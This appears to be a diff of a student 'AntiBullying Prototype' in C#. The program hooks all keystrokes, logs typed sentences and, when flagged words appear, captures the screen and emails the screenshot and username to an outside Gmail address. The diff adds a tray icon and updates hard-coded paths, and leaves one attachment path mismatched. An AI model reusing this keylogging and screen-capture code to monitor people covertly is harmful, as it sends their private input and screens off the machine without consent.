@@ -10,6 +10,7 @@ using System.IO;
 using KeyTrackerBase;
 using System.Drawing;
 using System.Net.Mail;//used for emailing
+using Test_2;
 
 //cyberbullying
 
@@ -20,22 +21,48 @@ namespace KeyTrackerBase
         string sentence;
         string badWords;
         string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
-        string[] words = File.ReadAllLines(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\words.txt");
+        string[] words = File.ReadAllLines(@"C:\\Users\\Dave\\Documents\\GitHub\\GroupProjectUpdated\\KeyTrackerBase\\words.txt");
         int countWord = 0;
         int countChar = 0;
         int countDetect = 0;
         int iScreen = 0;
 
+        //create icon 
+        NotifyIcon systemTrayIcon;
+        Icon applicationIcon;
+
         public Form1()
         {
+            #region Form Stuff
             //hide form
             this.WindowState = FormWindowState.Minimized;
+            //this.ShowInTaskbar = false;
 
-            this.ShowInTaskbar = false;
+            //Load icon
+            applicationIcon = new Icon("C:\\Users\\Dave\\Documents\\GitHub\\GroupProjectUpdated\\KeyTrackerBase\\Test_2\\f_Owl_Icon.ico");
+
+            //show system tray icon and assign the icon for it
+            systemTrayIcon = new NotifyIcon();
+            systemTrayIcon.Icon = applicationIcon;
+            systemTrayIcon.Visible = true;
+
+            //creates the menu in the system tray icon
+            MenuItem quitMenuItem = new MenuItem("Quit");
+            MenuItem programName = new MenuItem("AntiBullying Prototype v0.3");
+            MenuItem settingsItem = new MenuItem("Settings");
+            ContextMenu systemTrayMenu = new ContextMenu();
+            systemTrayMenu.MenuItems.Add(programName);
+            systemTrayMenu.MenuItems.Add(settingsItem);
+            systemTrayMenu.MenuItems.Add(quitMenuItem);
+            systemTrayIcon.ContextMenu = systemTrayMenu;
+
+            //creates events for the specific menu items
+            quitMenuItem.Click +=quitMenuItem_Click;
+            settingsItem.Click += settingsItem_Click;
 
             InitializeComponent();
-
-
+#endregion
+            
             #region Keys to watch
             gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
             gkh.KeyUp += new System.Windows.Forms.KeyEventHandler(gkh_KeyUp);
@@ -45,6 +72,17 @@ namespace KeyTrackerBase
 
             #endregion
 
+        }
+        //opens settings form on click in menu
+        void settingsItem_Click(object sender, EventArgs e)
+        {
+            Settings settingsForm = new Settings();
+            settingsForm.Show();
+        }
+        //quits the program
+        void quitMenuItem_Click(object sender, EventArgs e)
+        {
+            this.Close();
         }
 
         //new instance of glabal key hook
@@ -132,7 +170,7 @@ namespace KeyTrackerBase
                             {
                                 if (sentence != "")
                                 {
-                                    using (StreamWriter file = new StreamWriter(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\log.txt", true))
+                                    using (StreamWriter file = new StreamWriter(@"C:\\Users\\Dave\\Documents\\GitHub\\GroupProjectUpdated\\KeyTrackerBase\\log.txt", true))
                                     {
                                         if (e.KeyCode != Keys.OemPeriod)
                                         {
@@ -157,7 +195,7 @@ namespace KeyTrackerBase
                                                     Bitmap screencapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                                                     Graphics graphics = Graphics.FromImage(screencapture as Image);
                                                     graphics.CopyFromScreen(0, 0, 0, 0, screencapture.Size);
-                                                    screencapture.Save(@"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
+                                                    screencapture.Save(@"C:\\Users\\Dave\\Desktop\\screenshot" + iScreen + ".jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
                                                     
                                                     SendEmail("cyberbullyingauthority@gmail.com", "User: " + userName + badWords, "Sentence: " + sentence, @"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".jpeg");
                                                     iScreen++;
